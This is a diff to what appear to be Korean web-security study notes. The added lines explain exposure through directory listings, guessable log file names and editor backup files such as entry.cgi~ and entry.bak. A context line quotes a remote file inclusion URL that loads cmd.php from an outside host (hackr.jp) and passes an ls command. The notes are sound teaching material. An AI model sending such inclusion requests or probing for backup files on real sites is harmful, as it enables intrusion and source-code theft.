@@ -241,3 +241,20 @@ http://example.com/foo.pho?mod=http://hackr.jp/cmd.php&cmd=ls
 ```
 http://www.example.com/log/
 ```
+- 디렉토리 이름을 지정함으로써 파일 일람이 표시되고 파일명을 알아버리게 된다.
+
+#### 추측하기 쉬운 파일명, 디렉토리명
+```
+http://www.example.com/entry/entry_081202.log
+// 파일명을 예측하기 쉬운(위의 경우, entry_081202.log 등)
+```
+
+#### 백업 파일
+```
+http://www.example.com/cgl-bin/entry.cgi (본래 파일)
+http://www.example.com/cgl-bin/entry.cgi~ (백업 파일)
+http://www.example.com/cgl-bin/entry.bak (백업 파일)
+```
+- 에디트 소프트웨어 등에서 자동 생성하는 백업 파일은 실행 권한이 없어 소스 코드가 표시되는 경우도 있다.
+
+#### 인증 후에만 표시되어야 하는 파일
